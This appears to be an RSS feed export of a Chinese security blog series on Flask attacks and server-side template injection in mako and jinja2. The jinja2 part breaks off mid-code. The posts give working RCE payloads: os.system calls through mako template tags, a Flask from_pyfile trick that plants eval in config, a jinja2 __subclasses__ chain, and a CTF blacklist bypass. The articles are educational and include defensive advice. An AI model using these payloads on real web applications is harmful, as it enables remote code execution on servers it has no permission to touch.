沙箱逃逸的经验总结》中我们提到过，如果存在文件写漏洞，则可以通过 import 或者 exec 等等完成 RCE。</p><p>在 flask 的场景下，还有一个特殊的途径。</p><p>在 <code>from_pyfile</code> 中，会执行 exec，且由于 exec 的特性，会把 exec 中执行生成的变量存储在 <code>d.__dict__</code>，所以 exec 中的变量均可以通过 <code>d.</code> 获取到。而最后又会调用 <code>from_object</code>，这个函数会将全大写的变量名置为 <code>self</code>（也就是 <code>flask.Flask.config</code>）的属性。</p><p>关键代码如下：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e95e5f6b-26b4-4a4f-a86d-a5fbe2c3b348.png!blog" /></p><p>既然如此，我们可以先在目标环境中创建一段包含 Python 代码的文件（比如任意文件上传），并在里面创建一个全大写变量名 <code>CMD = eval</code>，然后触发 <code>from_pyfile</code>（例如 SSTI），这样就可以在 config 中直接用到这个 eval：<br /><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>)<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.from_pyfile</span>(<span class="hljs-string">&quot;file.png&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>然后直接 <code>&#123;&#123;config.CMD&#125;&#125;</code> 使用即可：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/4667502f-1e22-4647-9973-3f29a4211126.png!blog" /></p><p>个人觉得这个也算内存马了。</p><h2 id="总结">总结</h2><p>flask 的攻击面还是比较广的，毕竟作为一个 Web 应用框架，能承载的功能是非常丰富的，它还有各种各样的插件。</p><p>所以在考量 flask 应用的时候，flask 本身的安全性（代码/架构）、通过 flask 搭建的应用的安全性（代码/逻辑）、插件（第三方代码）都是不可或缺的一部分。所以这部分的内容一篇文章恐难以总结全，本文就先介绍到这，后面如果发现新的姿势会继续补充。</p><h2 id="资料">资料</h2><ol type="1"><li>werkzeug 文档<br />https://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/tutorial.html</li><li>flask cve<br />https://snyk.io/vuln/pip:flask</li><li>flask-session-cookie-manager<br />https://github.com/noraj/flask-session-cookie-manager</li><li>SecMap - SSTI（jinja2）<br />https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/</li><li>flask 标准上下文<br />https://flask.palletsprojects.com/en/2.1.x/templating/#standard-context</li><li>flask request 属性<br />https://flask.palletsprojects.com/en/2.1.x/api/#incoming-request-data</li><li>dibber<br />https://github.com/Macr0phag3/dibber</li></ol></br><p style="text-align: center; font-weight: bolder"><font size="2" color="gray">最近遇到了 Python + yaml 的反序列化问题<br>所以下一篇估计是补齐一下这部分知识点<br>一起加油 💪</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;SecMap 系列之 Flask，本篇介绍 flask 相关的攻击手法。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - SSTI（mako）</title>
    <link href="https://www.tr0y.wang/2022/04/29/SecMap-SSTI-mako/"/>
    <id>https://www.tr0y.wang/2022/04/29/SecMap-SSTI-mako/</id>
    <published>2022-04-29T19:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>SecMap 系列之 SSTI（mako），继续冲鸭！预祝各位五一快乐！</p><span id="more"></span><p>SSTI（Server-Side Template Injection）服务端模板注入。</p><p>上一篇我们介绍了 jinja2 的 SSTI，SSTI 具体的定义就不啰嗦了。</p><p>mako 的一些设计和使用方式与 jinja2 是非常相似的，截止目前（2022），主流的模板语言就是 jinja2 和 mako。所以这篇就开门见山地来介绍下 mako 的 SSTI。</p><p>注：本文基本上都是 py3.x 的环境。</p><h2 id="介绍">介绍</h2><p>mako 是 Pylons 的默认模板语言，它们之间的关系与 jinja2 和 flask 的关系类似。</p><p>首先还是先了解下语法规则。</p><p>依旧推荐官方文档，见资料 1</p><h3 id="mako-语法">mako 语法</h3><p>作为一门模板语言，肯定有自己的一套语法规则。</p><h4 id="基础语法">基础语法</h4><p>mako 的基础语法规则一共 3 种：</p><ol type="1"><li>变量取值：<code>$&#123; &#125;</code>，比如输入 <code>1+1</code>，<code>2*2</code>，或者是字符串、调用对象的方法，都会渲染出执行的结果</li><li>控制结构：<code>%for ... : %endfor</code>、<code>%if ... : ... %elif: ... % else: ... %endif</code></li><li>Python 代码块：<code>&lt;% ... %&gt;</code></li><li>导入模块：在代码块的基础上加一个感叹号 <code>&lt;%! ... %&gt;</code></li><li>定义函数：<code>&lt;%def name="..." &gt; ... &lt;/%def&gt;</code>，调用：<code>$&#123;...()&#125;</code></li><li>注释：<code>##</code>（单行）、<code>&lt;%doc&gt;</code>（多行）</li><li>其他：<ol type="1"><li>继承模板：<code>&lt;%inherit ... /&gt;</code></li><li>包含模板：<code>&lt;%include ... /&gt;</code>，引用：<code>&lt;%page ... /&gt;</code></li><li>还有很多，不列举了，见：资料 2，在实际的利用过程中用到的比较少，业务上可能比较多。</li></ol></li><li>可以看到上面非常依赖 <code>%</code>，如果非要用到 <code>%</code>，需要写成 <code>%%</code></li></ol><p>对于常用的语法，看一个例子就懂了：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> mako.template <span class="hljs-keyword">import</span> Template<br><br>tp = Template(<span class="hljs-string">&#x27;&#x27;&#x27;## 这是一个注释</span><br><span class="hljs-string">&lt;%def name=&quot;my_range(n)&quot; &gt; &lt;% return list(range(n))%&gt; &lt;/%def&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;% c = 5 %&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">% for i in my_range(c)+a:</span><br><span class="hljs-string">    %if i % 2:</span><br><span class="hljs-string">        $&#123; i &#125;</span><br><span class="hljs-string">    %endif</span><br><span class="hljs-string">% endfor</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(tp.render(a = [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]))<br></code></pre></td></tr></table></figure></p><p>结果就是输出 1、3、5、7、9</p><p>另外，mako 还有一个值得一提的特殊语法：过滤器</p><h4 id="过滤器">过滤器</h4><p>官方文档见资料 3</p><p>单个过滤器的使用和 jinja2 一样很像，都是用 <code>|</code> 来引用。如果要使用多个过滤器，mako 需要用 <code>,</code> 来指定：<code>$&#123;" &lt;tag&gt;some value&lt;/tag&gt; " | h,trim&#125;</code></p><p>要定义自己的过滤器也比较简单，不需要和 jinj2 一样操作 <code>environment</code>，只需要定义一个函数即可使用：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;%!<br><span class="hljs-keyword">import</span> myfilters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myescape</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;TAG&gt;&quot;</span> + text + <span class="hljs-string">&quot;&lt;/TAG&gt;&quot;</span><br>%&gt;<br><br>Here<span class="hljs-string">&#x27;s some tagged text: $&#123;&quot;text&quot; | myescape&#125;</span><br><span class="hljs-string">Here&#x27;</span>s some tagged text: $&#123;<span class="hljs-string">&quot;text&quot;</span> | myfilters.myescape&#125;<br></code></pre></td></tr></table></figure></p><p>非常优雅。</p><h2 id="ssti-in-mako">SSTI in mako</h2><h3 id="攻击思路">攻击思路</h3><p>可以看到，mako 本身可以完美支持 Python 语句，所以利用 <code>&lt;% %&gt;</code>、<code>&lt;%! %&gt;</code>、<code>$&#123;&#125;</code> 可以非常轻松地进行攻击，例如：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;%!<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;whoami&quot;</span>)<br>%&gt;<br><br><span class="hljs-comment"># 或者</span><br><br>&lt;%<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;whoami&quot;</span>)%&gt;<br><br><span class="hljs-comment"># 或者</span><br><br>$&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;whoami&quot;</span>)&#125;<br></code></pre></td></tr></table></figure></p><p>其中 <code>$&#123; &#125;</code> 与 jinja2 的 <code>&#123;&#123; &#125;&#125;</code> 比较类似，但由于 mako 直接支持 Python 语法，所以 <code>$&#123; &#125;</code> 可以直接使用内置函数，例如 <code>dir</code>。更不用说还有 <code>&lt;% %&gt;</code>、<code>&lt;%! %&gt;</code> 了。</p><p>当然控制结构 <code>%for ... : %endfor</code>、<code>%if ... : ... %elif: ... % else: ... %endif</code> 也是 ok 的。</p><p>所以 mako 的 SSTI 手法基本上兼容 jinja2 的 SSTI 手法，可以说思路灵活得多。</p><h3 id="bypass-思路">bypass 思路</h3><h4 id="常规-思路">“常规” 思路</h4><p>目前我还没遇到过滤很严格的情况。我感觉大部分过滤技巧都可以参考 jinja2 的技巧（见资料 5）或者是 Python 沙箱逃逸（见资料 6）的技巧。<del>为了避免有水字数的嫌疑</del>，我就不赘述了</p><h4 id="mako-有的特殊姿势">mako 有的特殊姿势</h4><p>mako 引入了新的默认变量：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">In [<span class="hljs-number">57</span>]: Template(<span class="hljs-string">&quot;$&#123; locals() &#125;&quot;</span>).render()<br>Out[<span class="hljs-number">57</span>]: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  &#x27;context&#x27;: &lt;mako.runtime.Context object at 0x7fd5e8af99d0&gt;,</span><br><span class="hljs-string">  &#x27;pageargs&#x27;: &#123;&#125;,</span><br><span class="hljs-string">  &#x27;__M_caller&#x27;: None,</span><br><span class="hljs-string">  &#x27;__M_locals&#x27;: &#123;</span><br><span class="hljs-string">    &#x27;pageargs&#x27;: &#123;&#125;</span><br><span class="hljs-string">  &#125;,</span><br><span class="hljs-string">  &#x27;locals&#x27;: &lt;built-in function locals&gt;, </span><br><span class="hljs-string">  &#x27;__M_writer&#x27;: &lt;built-in method append of collections.deque object at 0x7fd5c8013ac0&gt;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure></p><p>其中比较关键的有：</p><ol type="1"><li><code>locals</code>：这个就是 <code>locals</code>，</li><li><code>context</code>：见资料 4</li><li><code>__M_writer</code>：与 print 类似，可以直接打印字符串</li><li><code>pageargs</code>：<code>render</code> 里的参数会在这里面</li></ol><p>如果在遇到无回显的场景，就可以用 <code>__M_writer</code>、<code>context.write</code> 尝打印。</p><p>例如：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> mako.template <span class="hljs-keyword">import</span> Template<br><br>tp = Template(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">%for i in x:</span><br><span class="hljs-string">  &quot;a&quot;</span><br><span class="hljs-string">%endfor</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(tp.render())<br></code></pre></td></tr></table></figure></p><p>其中 x 是注入点。</p><p>那么我们就可以用 <code>str(__M_writer(str(__import__("os").system("id"))))</code> 来实现回显。当然，盲注或者弹 shell 也是 ok 的。</p><p>还有一种类型的利用 <code>context.kwargs</code> 来获取上下文环境中传递的值。例如一个 web 接口有用到 mako，且有一个参数 name，那么可以直接在模板中使用这个变量名，这个时候通常需要 eval 下。</p><h2 id="课后题">课后题</h2><p>mako 的 CTF 很少，我只见过一道，就是今年 2022-susctf 的 HTML practice。</p><p>这道题首先需要 fuzz 出模板类型，这一步只能靠经验了。</p><p>得出是 mako 之后，还可以得到黑名单：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">%&gt;  /&gt;  _  +  $  [  <span class="hljs-string">&#x27;  &quot;</span><br><span class="hljs-string">chr  ord  hex  eval  exce</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure></p><p>所以 <code>$&#123; &#125;</code>、<code>&lt;% %&gt;</code>、<code>&lt;%! %&gt;</code> 都不行，那么用控制结构来调用命令语句即可。这道题是没回显的，需要回显的话，可以用上文说到的办法来玩。这道题由于过滤的是 <code>eval</code>，有需要的话我们就可以用修饰字符绕过字符过滤，<code>ᵉᵥᵃˡ</code>：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-mako/a1923231-caae-42fc-87ae-f0d72e6a733c.png!blog" /></p><p>当然，这个技巧也在 Python 沙箱逃逸中介绍过了。</p><h2 id="dibber">dibber</h2><p>从 Python 沙箱逃逸，到 Python 反序列化（见资料 8），到 jinja2 的 SSTI，再到 mako 的 SSTI，可以发现我们常常需要去搜索可以利用的攻击链。假设给定一个对象 <code>[]</code>，如何通过 mro 搜到 os 模块呢？</p><p>我以前的做法就是用 dir 来找疑似高危的模块，然后进一步分析是否有引入 os 模块。这样效率太低了。所以我写了一个自动搜索的工具，叫 <code>dibber</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-mako/5d9a1377-ddec-4049-913e-3a9f0ad933c0.png!blog" /></p><p>目前已经可以支持 原始的 Python 代码、jinja2、mako 这三种形式的搜索，例如 mako 的 <code>context</code>，深度设定为 4，就可以得到以下结果：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-mako/aa2e5b88-deaa-4c5d-a2bd-deef34115743.png!blog" /></p><p>如果遇到其他模板，或者是想搜索其他模块、函数，也可自行添加插件。感兴趣的橘友们可以试试，见资料 7</p><h2 id="防御">防御</h2><p>相比于 jinja2 来说，使用 mako 肯定更爽，因为可以随意在模板中插入 Python。但是，攻击者也很爽。</p><p>并且对比于 jinja2 来说，jinja2 有沙箱模式，mako 没有，所以在安全性上来说，mako 用起来更加危险。所以还是不要让模板对用户可控了吧。如果非要这样的话，可以用 render 参数来传递给模板，不要直接做拼接。</p><h2 id="资料">资料</h2><ol type="1"><li>mako 官方文档<br />https://docs.makotemplates.org/en/latest/</li><li>mako 标签<br />https://docs.makotemplates.org/en/latest/syntax.html#tags</li><li>mako 过滤器<br />https://docs.makotemplates.org/en/latest/filtering.html</li><li>mako context 文档<br />https://docs.makotemplates.org/en/latest/runtime.html#context</li><li>SSTI-jinja2<br />https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/</li><li>Python 沙箱逃逸经验总结<br />https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/</li><li>dibber<br />https://github.com/Macr0phag3/dibber</li><li>Python 反序列化<br />https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/</li></ol><br><p style="text-align: center;"><font size="2px" color="gray">下期应该是 flask 相关的知识点<br><br>这段时间大家都好难啊...<br>又是疫情，又是股灾的...<br>还好快放假了，有了一些喘息的时间<br>提前祝各位五一快乐！！！</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;SecMap 系列之 SSTI（mako），继续冲鸭！预祝各位五一快乐！&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
    <category term="SSTI" scheme="https://www.tr0y.wang/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>SecMap - SSTI（jinja2）</title>
    <link href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/"/>
    <id>https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/</id>
    <published>2022-04-13T16:07:13.000Z</published>
    <updated>2023-05-04T09:44:57.352Z</updated>
    
    <content type="html"><![CDATA[<p>SecMap 系列之 SSTI（jinja2）</p><span id="more"></span><p>SSTI（Server-Side Template Injection）服务端模板注入。</p><p>SSTI 其实和编程语言、框架、模板语言都没啥强绑定关系，只是不同编程语言或者模板语言有不同的注入姿势罢了。SSTI 由于涉及到的组件非常多，还和特定组件的利用方式（比如 <code>SSTI + jinja2</code> 和 <code>SecMap - Flask</code> 有很大关系），但是由于篇幅原因应该分开来写，所以我拆的细了一些，本文主要讲 jinja2 的 SSTI。后面还会有其他模板语言、框架的利用介绍，反正慢慢写橘友们慢慢看吧。</p><p>注：本文基本上都是 py3.x 的环境。</p><h2 id="介绍">介绍</h2><p>既然所谓模板注入，我们就先要了解一下这个“模板”是怎么来的。这与所谓的 MVC（即 Model、View、Controller）息息相关，MVC 要实现的目标是将软件用户界面和业务逻辑分离以使代码可扩展性、可复用性、可维护性、灵活性加强。其中 View 层是界面，Model 层是业务逻辑，Controller 层用来调度 View 层和 Model 层。不过如何正确认识与利用 MVC 指导设计，我们暂时按下不表。</p><p>上文所谓的“模板”，简单来说就是一个其中包涵占位变量表示动态的部分的文件，模板文件在经过动态赋值后，返回给用户，可以理解为渲染。那其实就是这里的 <code>V</code> 所经常使用的一种东西。例如在 Python 中，jinja2 是我最为常用的模板语言，基于 jinja2 的组件也有很多，例如 flask，同样是我非常非常喜欢的 Web 框架。</p><h2 id="jinja2-语法">jinja2 语法</h2><p>依旧推荐官方文档，见资料 1</p><p>作为一门模板语言，肯定有自己的一套语法规则。</p><h3 id="基础语法">基础语法</h3><p>jinja2 的基础语法规则一共 3 种：</p><ol type="1"><li>控制结构 <code>&#123;% %&#125;</code>，也可以用来声明变量（<code>&#123;% set c = "1" %&#125;</code>）</li><li>变量取值 <code>&#123;&#123; &#125;&#125;</code>，比如输入 <code>1+1</code>，<code>2*2</code>，或者是字符串、调用对象的方法，都会渲染出执行的结果</li><li>注释 <code>&#123;# #&#125;</code></li><li>其他：还有些奇奇怪怪的语法，随着版本更新可能会去掉，这部分如果需要就看文档慢慢找</li></ol><p>对于这三种语法，看一个例子就懂了：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>tp = Template(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;#</span><br><span class="hljs-string">这是一个注释</span><br><span class="hljs-string">#&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;% set c = [5, 6, 7, 8, 9] %&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;% for i in a+c %&#125;</span><br><span class="hljs-string">    &#123;% if i % 2 %&#125; &#123;&#123; i &#125;&#125; &#123;% endif %&#125;</span><br><span class="hljs-string">&#123;% endfor %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(tp.render(a = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]))<br></code></pre></td></tr></table></figure></p><p>结果就是输出 1、3、5、7、9</p><p>另外，jinja2 还有特殊的语法：</p><ol type="1"><li>过滤器</li><li>模板继承</li></ol><h3 id="过滤器">过滤器</h3><p>文档见资料 4</p><p>过滤器可以理解为是 jinja2 里面内置的函数和字符串处理函数，用于修饰变量。甚至支持参数 <code>range(10)|join(', ')</code>；以及链式调用，只需要在变量后面使用管道符 <code>|</code> 分割，前一个过滤器的输出会作为后一个过滤器的输入，例如，<code>&#123;&#123; name|striptags|title &#125;&#125;</code> 会移除 HTML Tags，并且进行 title-case 转化，这个过滤器翻译为 Python 的语法就是 <code>title(striptags(name))</code>。</p><p>可以看出，过滤器极大丰富了模板的数据处理能力，同时也在后面攻击时发挥了很大的作用 :)</p><h3 id="宏">宏</h3><p>jinja2 内置了很多函数，嗯，非常不错，但是我还是觉得不够，怎么办呢？可以自己编写一个函数，然后在模板中调用，这就是宏（<code>macro</code>）的作用 — 自定义函数：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% macro hack(name=<span class="hljs-string">&quot;Macr0phag3&quot;</span>) %&#125;<br>&lt;h1&gt; Hacked by &#123;&#123; name &#125;&#125; &lt;/h1&gt;<br>&#123;% endmacro %&#125;<br><br>&lt;p&gt; &#123;&#123; hack(<span class="hljs-string">&#x27;Tr0y&#x27;</span>) &#125;&#125; &lt;/p&gt;<br>&lt;p&gt; &#123;&#123; hack() &#125;&#125; &lt;/p&gt;<br></code></pre></td></tr></table></figure></p><p>macro 后面跟函数名与参数，调用方法也很 Pythonic。</p><h3 id="模板继承">模板继承</h3><p>文档见资料 5</p><p>模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。并且还支持针对自己需要的地方进行修改。</p><p>jinja2 的骨架文件中，利用 <code>block</code> 关键字表示其包涵的内容可以进行修改。这里直接举例吧：</p><p>这个是骨架文件：base.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    &#123;% block head %&#125;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&#123;% block title %&#125;&#123;% endblock %&#125; - Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    &#123;% endblock %&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span>&#123;% block content %&#125;&#123;% endblock %&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span><br>        &#123;% block  footer %&#125;<br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>This is javascript<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        &#123;% endblock %&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bbb.html 继承 base.html 的模板：<br /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% extends &quot;base.html&quot; %&#125;  <span class="hljs-comment">&lt;!-- 继承 --&gt;</span><br><br>&#123;% block title %&#125; Tr0y&#x27;s Blog &#123;% endblock %&#125;  <span class="hljs-comment">&lt;!-- title 自定义 --&gt;</span><br><br>&#123;% block head %&#125;<br>    &#123;&#123; super() &#125;&#125;  <span class="hljs-comment">&lt;!-- 用于获取原有的信息 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text/css&#x27;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.important</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-number">#FFFFFF</span> &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>&#123;% endblock %&#125;   <br> <br><span class="hljs-comment">&lt;!-- 其他不修改的原封不动的继承 --&gt;</span><br></code></pre></td></tr></table></figure></p><p>渲染：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> FileSystemLoader, Environment<br><br>env = Environment(loader=FileSystemLoader(<span class="hljs-string">&quot;./&quot;</span>))<br><span class="hljs-built_in">print</span>(env.get_template(<span class="hljs-string">&quot;bbb.html&quot;</span>).render())<br></code></pre></td></tr></table></figure></p><p>这里用到了 <code>FileSystemLoader</code>，其实用它的逻辑很简单。我们在 bbb.html 中写了 <code>&#123;% extends "base.html" %&#125;</code>，那 jinja2 怎么知道 base.html 在哪呢？<code>FileSystemLoader</code> 就是用来指定模板文件位置的。同样用途的还有 <code>PackageLoader</code>，它是用来指定搜索哪个 Python 包下的模板文件，以及其他，见资料 6</p><h3 id="杂项">杂项</h3><h4 id="去除空格">去除空格</h4><p>jinja2 中如果不加换行的话，可读性很差，如果加了的话，渲染后又会有多余的空格。我们可以在标签的前后加上 <code>-</code>，这样就不会有空格了：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% macro hack(name=<span class="hljs-string">&quot;Macr0phag3&quot;</span>) %&#125;<br>&lt;h1&gt; Hacked by &#123;&#123; name &#125;&#125; &lt;/h1&gt;<br>&#123;% endmacro %&#125;<br><br>&lt;p&gt; &#123;&#123;- hack(<span class="hljs-string">&#x27;Tr0y&#x27;</span>) -&#125;&#125; &lt;/p&gt;<br>&lt;p&gt; &#123;&#123;- hack() -&#125;&#125; &lt;/p&gt;<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-jinja2/d78241d5-4e91-4a0e-a036-bf7a2f0c6db3.png!blog" /></p><h2 id="ssti-in-jinja2">SSTI in jinja2</h2><h3 id="攻击思路">攻击思路</h3><p>由于模板语法对 Python 语句是有一定程度支持的，所以利用 <code>&#123;% %&#125;</code> 就可以非常轻松地进行攻击，例如：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<br>    Template(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &#123;% for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_wrap_close&quot; %&#125;</span><br><span class="hljs-string">            &#123;&#123; i.__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;) &#125;&#125; </span><br><span class="hljs-string">        &#123;% endfor %&#125;</span><br><span 